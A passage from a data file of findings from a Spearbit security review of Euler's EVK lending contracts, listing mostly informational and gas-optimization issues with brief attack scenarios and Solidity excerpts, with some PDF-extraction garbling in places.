Gas Optimization"]}, {"title": "Use custom errors for consistency and gas savings", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Although the usage of custom errors is generalized in the repository, a require condition is used instead of a custom error in this case. This should be resolved to keep consistency and save some gas. require(trailingData.length <= MAX_TRAILING_DATA_LENGTH, \"trailing data too long\");", "labels": ["Spearbit", "Euler", "Severity: Gas Optimization"]}, {"title": "BorrowUtils.decreaseBorrow behavior to round up debt should be documented", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Unlike increaseBorrow and transferBorrow that cast the assets amount (of type Assets) to Owed and interact with the user's debt position in Owed terms, the decreaseBorrow operation logic applies the inverse behavior, rounding up the user's exact debt, casting it to Assets and then interact with the repaid amount in Assets terms. Then it proceeds to update both the user's debt balance and totalBorrows recasting the remaining amount of debt to Owed. Following this behavior, the remaining debt of the users (and the totalBorrows as a consequence) will be saved as a rounded up version.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Violators can temporarily prevent liquidations by frontrunning the liquidation transaction and slightly increasing their position health", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "In a liquidation transaction, the liquidator specifies repayAssets, which represents the amount of un- derlying debt transferred from the violator to the sender. The liquidate function invokes the calculateLiquidation function to perform necessary liquidation calculations. At the end of the calculateLiquidation function, there is a check ensuring that desiredRepay is less than or equal to repay, calculated based on the violator's liabilities and collateral balance. 30 function calculateLiquidation( VaultCache memory vaultCache, address liquidator, address violator, address collateral, uint256 desiredRepay ) private view returns (LiquidationCache memory liqCache) { // Init cache // . . . // Checks // . . . liqCache = calculateMaxLiquidation(liqCache, vaultCache); // Adjust for desired repay if (desiredRepay != type(uint256).max) { uint256 maxRepay = liqCache.repay.toUint(); if (desiredRepay > maxRepay) revert E_ExcessiveRepayAmount(); // <--- if (maxRepay > 0) { liqCache.yieldBalance = desiredRepay * liqCache.yieldBalance / maxRepay; liqCache.repay = desiredRepay.toAssets(); } } } Violators can slightly decrease their maxRepay by either increasing their collateral or decreasing their borrowings, without bringing their positions back to health. This might cause the liquidation transaction to revert if the liquidator has performed a partial liquidation or specified an amount close to maxRepay.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Potential reorg attack risk for GenericFactory deployments on L2s", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The GenericFactory uses CREATE instead of CREATE2 for deploying the EVault proxies. Theoretical reorgs on L2s could enable a malicious deployment to divert funds from a legitimate proxy by utilizing the deposits made to this proxy. In a Slack conversation, it was mentioned that there are very loose plans to deploy the project on other chains. An example attack scenario includes the following steps:  Alice creates an EVault via the factory contract in Transaction A.  Alice deposits into the EVault in Transaction B.  A block reorg occurs, causing Transaction A to be discarded while Transaction B remains.  Normally, Transaction B would revert if executed.  Bob then deploys the EVault that Alice initially created, using the same address. 31  The deposit made by Alice now goes to Bob  s vault, performs some malicious actions by using the governor- only functions. More information on Blockchain Reorgs can be found in the Blockchain reorgs for Managers and Auditors article.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Naming improvement suggestions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": " REENTRANCYLOCK__UNLOCKED and REENTRANCYLOCK__LOCKED do not follow the common Open Zeppelin nam- ing case (NOT_ENTERED/ENTERED), additionally it is a long and redundant naming. Consider the following alternative namigs: UNLOCKED/ LOCKED, REENTRANCY_UNLOCKED/REENTRANCY_LOCKED instead.  burn function uses an input address, not msg.sender. Therefore, a more descriptive naming could be burn- From.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "The flashLoan function doesn't emit a dedicated FlashLoan event", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The flashLoan function currently only emits the ERC20:Transfer events, which are triggered in the ERC20 transfers.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Missing EVC() getter on ERC20Collateral and EulerSavingsRate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The ERC20Collateral and EulerSavingsRate are EVC-compatible but, on-chain, one cannot see what EVC these contracts are using as they are missing an EVC() getter to return the internal evc address. It's currently unclear what EVC deployment these contracts that can be used as collateral are compatible with which could lead to misconfigurations.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Consider not emitting the Approval event in BalanceUtils.decreaseAllowance following the same behavior of OZ ERC20", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The OpenZeppelin implementation of the ERC20 standard emits the Approve event only when the allowance is directly modified via approve.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Vault.skim should follow the same operation order of Vault.deposit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The skim operation is equivalent to a deposit operation without the need to \"pull\" the assets to be deposited from the sender given that those funds have been already deposited into the vault. With such a premise, the skim function should follow the same order of operations that the deposit function is performing when it executes finalizeDeposit(...).", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "liabilityValue does not need to be re-calculated Liquidation.calculateMaxLiquidation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The calculateMaxLiquidation function in the Liquidation modules is recalculating the liabili- tyValue like this uint256 liabilityValue = liqCache.liability.toUint(); if (address(vaultCache.asset) != vaultCache.unitOfAccount) { liabilityValue = vaultCache.oracle.getQuote(liabilityValue, address(vaultCache.asset), vaultCache.unitOfAccount); } But such value has been already calculated at the very beginning of the function and has been stored in liquid- ityLiabilityValue returned by the calculateLiquidity(...) execution.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Consider improving clearLTV and setLTV(..., ltv=0, ...) documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "While it's clear when the clearLTV should be called (given the Natspec documentation), it's partic- ularly clear the scenarios for which the governance should call setLTV(collateral, 0, rampDuration > 0) or setLTV(collateral, 0, rampDuration = 0) and not clearLTV or vice versa, and which are the specific conse- quences of those three scenarios and what happens when the LTV will reach targetValue = 0.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Governance.clearLTV should revert if the LTV has never been configured", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The clearLTV function should be callable only if an LTV has been configured and initialized.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Enforce EVC compatibility on new collateral added to EVK via setLTV", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The current documentation of EVC and EVK white paper describe the collateral as \"the address of an- other vault\" but the Governance.setLTV function does not perform any sanity check to enforce such requirements.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Consider including the initialized value in the GovSetLTV to track if the configured LTV is new or not", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The originalLTV == 0 information is not enough to know whether an LTV is new or not. Euler should consider including the initialized value in the GovSetLTV event to understand if the event has been emitted for a new or already configured LTV", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Consider allowing the user to disable the balance forwarder flag even when balanceTracker is not configured", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Considering the EVault could break if users have enabled balance forwarding and the balance- Tracker has been upgraded to address(0) scenario, a user could personally fix the operation by disabling the Balance Forwarder flag even if balanceTracker is equal to address(0) and the flag was previously enabled.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Improve the documentation about the Oracle in the EVK white paper", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The Oracle component is a crucial part of the EVK protocol and should be properly documented in both the codebase and EVK whitepaper. Some of the questions that a user, integrator or deployer could have (but not limited to) are:  Can we assume that the EulerRouter (the oracle returned by metadata()) has been correctly configured?  Assuming that the EulerRouter has been correctly configured, can the oracle.getQuote revert?  Assuming that the EulerRouter has been correctly configured, can the oracle.getQuote return 0?  Other assumptions or non-assumptions that can be made/not made?", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Improve the white paper Interest Overflow section, including the side effects of RPow.rpow overflow scenario", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "When the RPow.rpow overflows, the newInterestAccumulator is not updated and will use the old cached value. This means that interest is not accrued and newTotalBorrows will remain equal to vault- Cache.totalBorrows. If newTotalBorrows is <= MAX_SANE_DEBT_AMOUNT vault will update lastInterestAccumulatorUpdate to uint48(block.timestamp) anyway (unlike the case when newTotalBorrows overflows the sane amount). As a consequence, the whole interest accrued during deltaT time will be lost and \"reset\".", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Consider enhancing the Base.isOperationDisabled and all the max* vault functions documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "An EVault operation can be considered disabled in two cases: 1) The hookedOps flag of the operation is set and the hookTarget == address(0). 2) The hookedOps flag of the operation is set, the hookTarget != address(0) and the hookTarget reverts internally in a \"sane\" way to disclose the disablement of the operation. The second case can't be evaluated directly by the protocol without executing directly the operation, and it's out of scope of current usage of isOperationDisabled inside EVault that optimistically evaluates the maximum number of tokens that can be deposited/minted/withdrawn/redeemed. Given that the second scenario could happen, such an eventuality should be documented in both the isOpera- tionDisabled and all the max* vault functions to warn the user that the returned value is an optimistic evaluation.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "BorrowingUtils.transferBorrow and BalanceUtils.transferBalance do not handle correctly the self-transfer case", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "In both functions, when from == to the account balance will be wrongly updated. With the current codebase, this is not a security issue because the callers of this function will revert when the user tries to self- transfer to itself, but it's a good practice to avoid these kinds of mistakes directly to ensure that future changes to the protocol won't fall into this problem.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "EVault could break if users have enabled balance forwarding and the balanceTracker has been upgraded to address(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Every time the user's balance changes or the balance tracking flag is changed to true or false the balanceTracker.balanceTrackerHook hook will be triggered. While in the BalanceForwarderModule module the flag can be changed only if the balanceTracker has been con- figured, and for such reason, the hook can be triggered only in a non-reverting environment, in the BalanceUtils the value of balanceTracker is never sanity checked, and the hook is always triggered if the user has enabled the flag. If the user has enabled the flag and the EVault is upgraded to a vault that has the balanceTracker set to ad- dress(0) any interaction with the vault that updates the user's balance will revert, resulting in a broken vault. 37", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Zero address returned from MetaProxyDeployer is not explicitly handled in GenericFactory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The MetaProxyDeployer uses the CREATE opcodes to create a new instance, which returns a zero address and does not revert if the deployment fails. If a zero address is returned, execution will revert during IComponent(proxy).initialize(msg.sender).", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "IBalanceTracker natspec documentation should be improved", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Unlike all always increased or decreased compared to the value before the operation, ule.enableBalanceForwarder balanceTracker.balanceTrackerHook with \"special\" values. the \"normal\" operations inside the various modules where the balance is the BalanceForwarderMod- execute BalanceForwarderModule.disableBalanceForwarder will and  BalanceForwarderModule.enableBalanceForwarder will always report the current user's balance, unchanged.  BalanceForwarderModule.disableBalanceForwarder will always report 0 even if the balance of the user is greater than zero. On top of these \"special\" values, the contract that implements the IBalanceTracker interface should be aware that balanceTrackerHook could be called multiple times, even inside the same block, given that enableBalanceFor- warder and disableBalanceForwarder have no restrictions. These custom behaviors should be documented by the IBalanceTracker interface for the newAccountBalance parameter.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Inaccurate Deposit event can be emitted during the skim function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "When the skim function is called, the Deposit event is emitted with the onBehalfOfAccount as the sender. However, the onBehalfOfAccount might not be responsible for the excess asset balance.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Consider adding to the PegStabilityModule utility functions that allow to preview the amount of asset received with a swap", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "PegStabilityModule allows users to exchange ESynth asset for an underlying asset (less a fee) It would be helpful for the users, before executing the real exchange, to preview the returning and vice versa. amount given:  the fee to be applied.  The available liquidity of the assets:  Available underlying balance if the users want to swap ESynth for underlying.  Available PegStabilityModule minting capacity if the users want to swap underlying for ESynth (that must be minted new).  Possible user restriction when the user's ESynth asset are exchanged (burned) for underlying. The ESynth.burn function calls ERC20Collateral._update which will require an account status check for the user who has called the PegStabilityModule. If the user has enabled a controller and is unhealthy, the transaction will revert.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "If gulp is never called, available interest is not accounted and accrued and withdrawing users won't receive deserved interest", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "gulp is the ESR mechanism that starts the accrual of the amount of asset that has been sent to the ESR by an external entity. Once gulp is called, such amount is added to esrSlot.interestLeft and esrSlot.interestSmearEnd is resetted to block.timestamp + INTEREST_SMEAR. If no one calls gulp, the interest won't start accruing even if it has been already deposited in the ESR module, and users who withdraw from the ESR module won't receive the deserved interest that they should receive: 1) Alice deposits 10e18. 2) 10e18 interests are sent to the ESR. 3) Alice waits 2 weeks. 4) Alice withdraws, thinking that she will get 20e18, but she will only get back her 10e18 initially deposited.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "EulerSavingsRate uses default virtual shares", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The EulerSavingsRate is itself an ERC4626 vault that can directly be used as collateral in the EVC, without first wrapping the shares in an escrow vault. Therefore, it should implement the same parameters as the eVault to get the same level of price share manipulation resistance.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "maxRedeemInternal could be private", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The maxRedeemInternal function could be private instead of internal, similar to maxDepositIn- ternal.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "RiskManager.checkAccountStatus will be executed even if the user has interacted with a non- collateral asset", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "When an account (directly or \"indirectly\" on behalf of him/her) performs an operation (transfer, redeem, withdraw) that could decrease his/her health factor, the EVK ecosystem (EVault, ESynth, PegStability- Module, EulerSavingRate) will require the EVC to perform a check at the end of the EVC call or batch flow if the user has enabled a controller. At the end of the flow, EVC will call RiskManager.checkAccountStatus which will always revert if the user is un- healthy. If the user has a controller enabled, this logic will always be executed, without considering which was the asset that was interacted with. This means that checkAccountStatus will be invoked even if the user had not enabled the asset as collateral. When an asset is not enabled as collateral, it means that it cannot influence the user's health factor and should be allowed to be transferred or withdrawn freely without triggering a health check status. Because of the EVK/EVC logic and the current behavior, we have the following negative side effects:  If the user is unhealthy, the transaction will revert even if the user tries to transfer, redeem or withdraw a non-collateral asset (that cannot decrease the HF furthermore).  transfer, redeem or withdraw of a non-collateral asset will consume more gas than it should because of the check-account-status additional logic. The above negative side effects will be applied in all these cases:  EVK transfer, transferFrom, withdraw and redeem.  ESynth transfer and transferFrom.  Swapping ESynth for underlying on the PegStabilityModule via the swapToUnderlyingGivenIn and swap- ToUnderlyingGivenOut.  EulerSavingRate transfer, transferFrom, withdraw and redeem. Note that this behavior differs from what a normal user is used to with other lending protocols. Usually, an operation that involves a non-collateral asset can be performed freely without any restriction related to the user's health factor and will consume less compared to an operation on a collateral asset.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Observed values related to interestAccumulator can drop once loadVault() handles overflows", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Some functions only load the vault and update it in memory, without writing the updated data back to storage. Combined with the fact that old interest accumulators (and by extension old totalBorrows and to- talShares) are used in case the new interest accumulator would overflow, it can lead to the situation that view functions or checkAccountStatus use values that first rise, but then suddenly drop once the accumulator overflows.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Liquidations that don't repay debt still emit borrow events", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "If the violator is healthy, liquidation continues with a no-op. The transferBorrow(vaultCache, liqCache.violator, liqCache.liquidator, liqCache.repay); code is always executed and would emit events transferring 0 assets.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Ambiguous return parameters for loop / deloop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The deloop function can readjust the assets parameter in case assets > owed. A caller must not believe that the returned shares are equivalent to the amount parameter they used (even if amount != uint256.max).", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Unclear usecase for loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The Euler protocol does not allow self-collateralization (using the same asset as collateral that is borrowed). Therefore, any loop call can be implemented with a single round of a borrow(account); de- posit(sharesReceiver) sequence in a batch.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Caching of interest rate could lead to issues for non-pure IRMs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The interest rate is retrieved from the IRM once in the checkVaultStatus function. The result is then cached to storage. This cached rate will be used in the subsequent vault interactions (that can happen at different blocks). If an advanced IRM depends on block.timestamp or other derived on-chain state, the interest rate can change but it will not be used for the active vault interactions.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Interest rate will be underestimated due to keeping utilisation constant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The interest rate compounds every second with a cached interest rate (per second). However, the IRM would quote a higher interest rate if the compounding happened every second (or block) as the utilisation = totalBorrows / (totalBorrows + cash) increases.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Forgiving vault checks would end up with lingering snapshot", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "In case the EVK implements an EVC.forgiveVaultStatusCheck call, the vault snapshot would not be cleared as it is only cleared in the checkVaultStatus callback. The next vault interaction will not overwrite the snapshot, instead, it will perform the check on an outdated, lingering snapshot.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Inconsistent rounding for yield = repay / discount liquidation computation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "For liquidations, the repaid amount relates to the seized collateral (yield) by yield = repay / dis- count, rounding down the yield. However, if the violator's collateral balance is less than the max yield, the entire collateral balance is seized and the repaid amount is readjusted, rounding down the repaid amount this time.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "IPriceOracle is out of sync with euler-price-oracle repo", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The interface appears to be out of sync with the euler-price-oracle repository and is inconsistent. It includes features like the name getter, which isn't present in the original. Moreover, defined errors are only used in MockPriceOracle.sol during testing.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Unused reentrancy lock in BaseProductLine", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "reentrancyLock is not used actively at BaseProductLine nor on any contract that inherits from it, therefore it should be removed", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Unused logic and confusing event in setVaultInterestFeeRange and setVaultFeeConfig", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "When exists_ is false, updating _interestFeeRanges[vault] with a non-default value and emit- ting an event can be confusing. It forces the caller to provide valid minInterestFee_ and maxInterestFee_ values, which won't be used when _interestFeeRanges is retrieved because it would be necessary to re-execute set- VaultInterestFeeRange(vault, true, ...) to enable it with proper interest fees.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "uint caps version is not consistently used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "vaultCache uses the uint256 version of caps rather than the uint16 version from vaultStorage (AmountCap):  If vaultCache.supplyCap != type(uint256).max, it should be <= 2 * MAX_SANE_AMOUNT (see Governance.setCaps checks).  If vaultCache.borrowCap != type(uint256).max, it should be <= MAX_SANE_AMOUNT (see Governance.setCaps checks). Using the type(uint256).max value directly for the \"no cap\" scenario would be cleaner", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "pushAssets would benefit from extra documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The handling of sub-accounts through the EVC flag would benefit from extra clarifications. 1. CFG_EVC_COMPATIBLE_ASSET flag: This flag should be true if the vault's underlying asset is another vault or an EVC-compatible ERC20Collateral. 2. pushAssets function checks: The whole idea of the checks is to protect users from mistakenly setting a sub-account (non-zero one) as receiver in functions that send tokens out (withdraw, redeem, borrow). If a regular asset is sent to a sub-account it would effectively be lost, since the private keys are not known. It's only EVC that understands that sub-accounts have owners and only assets that authenticate through EVC can safely accept receiver that is a sub-account. 3. Example USDC Vault transfer cases:  Case 1: transfer to non-registered EVC account ! success. It is allowed just because it is not known if it's a sub-account or owner.  Case 2: transfer to a registered EVC account that is equal to the owner of the account ! success. You know that account can indeed interact with EVC so it means that it's an EOA/contract that will be able to interact eventually with the ERC20. This is not entirely true, you know that account can interact with EVC, but you don't know if it can interact with the asset. account in this case could be != originalCaller.  Case 3: transfer to a registered EVC account that's not owned by the caller, with a high probability that the asset is unrecoverable as that owner probably does not own the private key of the account to later on interact with asset. 46", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "calculateDTokenAddress may fail if anything changes in the future code", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "ule.initialize creates a new DToken as the first contract deployed by the vault. On calculateDTokenAddress, mstore8(0x34, 0x01) is true because InitializeMod- If anything changes in the future code of InitializeModule.initialize or during the initialization flow (contract deployed before DToken) the 0x01 value should be adjusted accordingly.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "checkLiquidation doesn't revert if violator has no debt or has more collateral than debt", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "checkLiquidation function does not revert if the violator has no debt or has more collateral than debt (in value). In that case, both maxRepay and maxYield will be equal to zero.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Inconsistency in CONTROLLER_NEUTRAL_OPS", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "CONTROLLER_NEUTRAL_OPS is a constant that incorporates different OPs for later use: uint32 constant CONTROLLER_NEUTRAL_OPS = OP_DEPOSIT | OP_MINT | OP_WITHDRAW | OP_REDEEM | OP_TRANSFER | ,! OP_SKIM | OP_REPAY | OP_DELOOP | OP_CONVERT_FEES | OP_FLASHLOAN | OP_TOUCH; However, it is noticed that OP_VAULT_STATUS_CHECK should be one of the controller-neutral operations because it's unrelated to a specific account's borrowing state. It doesn't matter in the actual state of the codebase as it's not used via initOperation (the only place CON- TROLLER_NEUTRAL_OPS is used) but so does OP_FLASHLOAN and it is in this list.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Casting to the same type is redundant and adds verbosity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Casting a type to the same type is redundant and adds verbosity. In EVCClient, evc (of IEVC type) is cast to IEVC again.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "validate should be moved to Types.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "ConfigAmountLib.validate is only used in Types.sol and therefore, the logic can be moved to Types.sol in order to enhance simplicity and coherence.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Consistently use toUint rather than unwrap", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Assets, Shares, Owed and ConfigAmount libraries all define a toUintX function that unwraps the different types into some uint-like type. To be coherent with the use of unwrap and all the different toUint functions should be consistent unless there's a specific reason to not do it.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "interestAccruedFromCache can avoid extra operations and return earlier", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "At interestAccruedFromCache, when the timestamps are equal (timePassed = totalDuration) we would also return interestLeft. Therefore, by modifying the same block we will return the same value without doing extra operations.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "English dialect inconsistencies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "A common best practice is to use one language and dialect for the sake of consistency, readability and maintainability. For example: \"utilisation\" (british) with \"s\" is used, while in another place \"utilize\" (american) with \"z\". Then, in another part is used \"initialize\" (american), etc...", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "ESynth mints are centralized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "setCapacity is an admin function that will set the maximum capacity of mints an address can have, allowing or disallowing users to mint this way. As the admin is the one who first allows users to mint, this should not be a problem. However, if for any strange reason someone who initially is set to any non-zero capacity tries to mint, and the admin wants to DoS them by setting it to 0 capacity, they will avoid that person from minting any token, effectively \"banning\" this person from minting. The logic is as follows: function setCapacity(address minter, uint128 capacity) external onlyOwner { minters[minter].capacity = capacity; emit MinterCapacitySet(minter, capacity); } And later checked at mint that will revert if not enough capacity is set: if ( amount > type(uint128).max - minterCache.minted || minterCache.capacity < uint256(minterCache.minted) + amount ) { } revert E_CapacityReached();", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "PegStabilityModule swapToUnderlyingGivenIn and swapToSynthGivenIn should early return/revert when amountOut is 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Due to rounding down, amountOut could be equal to 0 and it could therefore early return or revert to cut unnecessary actions and event emissions.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Named imports provide more readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The use of named imports from Solidity files provides clarity and readability. Named imports make it immediately clear which specific functions, contracts, or variables are being utilized from a particular module, reducing ambiguity and making the code easier to understand and maintain. For example in LTVUtils: \"./types/Types.sol\"; import \"./types/Types.sol\"; should be import {ConfigAmount} from", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Inconsistent naming decreases the codebase searchability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Consistency is key for a more searchable and maintainable system, either for users, developers, researchers, etc... To know what to look for within the codebase just by a consistent naming, and to understand faster how things should behave. Some instances of these include:  Functions like toUint be changed to toUint256, or their counterparts, toSharesDownUint256 to toShares- DownUint.  governor be changed to governAdmin, or upgradeAdmin just to admin.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Helper retriever functions can return dummy data", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The use of public push functions (createVault, createProxy) with no access control and without their counterpart pop function to remove unnecessary elements, can lead to an array full of dummy data that later is iterated in order to create some sort of pagination. These arrays are used as helpers for lens-type contracts. This shouldn't be a problem in this case as both start and end items are set. Therefore, under common circum- stances there won't be an out-of-gas scenario (maybe in the case of special case end == 